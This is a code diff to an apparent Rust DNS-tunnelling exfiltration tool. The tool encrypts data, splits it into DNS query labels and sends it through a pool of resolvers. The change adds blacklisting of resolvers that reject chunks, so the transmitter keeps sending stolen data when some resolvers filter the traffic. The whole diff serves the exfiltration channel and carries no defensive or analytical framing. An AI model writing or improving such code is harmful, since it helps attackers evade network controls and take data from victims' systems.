@@ -8,9 +8,10 @@ use crate::metadata::ExfilSession;
 use crate::resolver::ResolverPool;
 use anyhow::{anyhow, Context, Result};
 use rand::Rng;
+use std::collections::HashMap;
 use std::convert::TryInto;
 use std::net::{Ipv4Addr, SocketAddr, UdpSocket};
-use std::time::Duration;
+use std::time::{Duration, Instant};
 use trust_dns_proto::op::{Message, MessageType, OpCode, Query};
 use trust_dns_proto::rr::{Name, RData, RecordType};
 use trust_dns_proto::serialize::binary::{BinEncodable, BinEncoder};
@@ -24,6 +25,8 @@ const ENVELOPE_FLAG_COMPLETE: u8 = 0x04;
 const ENVELOPE_FLAG_METADATA: u8 = 0x08;
 const ENVELOPE_FLAG_FINAL: u8 = 0x10;
 const FLAG_HEADER: u8 = 0x01;
+const RESOLVER_REJECT_THRESHOLD: u32 = 3;
+const RESOLVER_BLACKLIST_SECS: u64 = 120;
 
 pub struct DnsTransmitter {
     cfg: Config,
@@ -31,6 +34,8 @@ pub struct DnsTransmitter {
     aes_key: [u8; 32],
     last_domain: Option<String>,
     ack_next: Ipv4Addr,
+    resolver_blacklist: HashMap<SocketAddr, Instant>,
+    resolver_rejects: HashMap<SocketAddr, u32>,
 }
 
 impl DnsTransmitter {
@@ -47,6 +52,8 @@ impl DnsTransmitter {
             aes_key,
             last_domain: None,
             ack_next,
+            resolver_blacklist: HashMap::new(),
+            resolver_rejects: HashMap::new(),
         }
     }
 
@@ -104,10 +111,14 @@ impl DnsTransmitter {
 
         let mut last_err = None;
         for attempt in 0..3 {
-            let resolver = self.pool.next();
+            let resolver = self.next_resolver();
             match self.dispatch(&qname, resolver) {
-                Ok(true) => return Ok(()),
+                Ok(true) => {
+                    self.clear_resolver_penalty(resolver);
+                    return Ok(());
+                }
                 Ok(false) => {
+                    self.note_resolver_reject(resolver);
                     last_err = Some(anyhow!(
                         "resolver {} rejected chunk (attempt {})",
                         resolver,
@@ -279,6 +290,44 @@ impl DnsTransmitter {
         self.last_domain = Some(choice.clone());
         choice
     }
+
+    fn next_resolver(&mut self) -> SocketAddr {
+        let total = self.pool.len().max(1);
+        for _ in 0..total {
+            let candidate = self.pool.next();
+            if self.resolver_available(&candidate) {
+                return candidate;
+            }
+        }
+        let candidate = self.pool.next();
+        self.resolver_blacklist.remove(&candidate);
+        candidate
+    }
+
+    fn resolver_available(&mut self, resolver: &SocketAddr) -> bool {
+        if let Some(expiry) = self.resolver_blacklist.get(resolver) {
+            if Instant::now() < *expiry {
+                return false;
+            }
+            self.resolver_blacklist.remove(resolver);
+        }
+        true
+    }
+
+    fn note_resolver_reject(&mut self, resolver: SocketAddr) {
+        let entry = self.resolver_rejects.entry(resolver).or_insert(0);
+        *entry += 1;
+        if *entry >= RESOLVER_REJECT_THRESHOLD {
+            self.resolver_blacklist
+                .insert(resolver, Instant::now() + blacklist_expiry());
+            *entry = 0;
+        }
+    }
+
+    fn clear_resolver_penalty(&mut self, resolver: SocketAddr) {
+        self.resolver_rejects.remove(&resolver);
+        self.resolver_blacklist.remove(&resolver);
+    }
 }
 
 #[derive(Clone)]
@@ -422,6 +471,10 @@ fn split_encoded_labels(encoded: &str) -> Vec<String> {
                 .to_string()
         })
         .collect()
+}
+
+fn blacklist_expiry() -> Duration {
+    Duration::from_secs(RESOLVER_BLACKLIST_SECS)
 }
 
 fn max_value_for_width(width: usize) -> u32 {
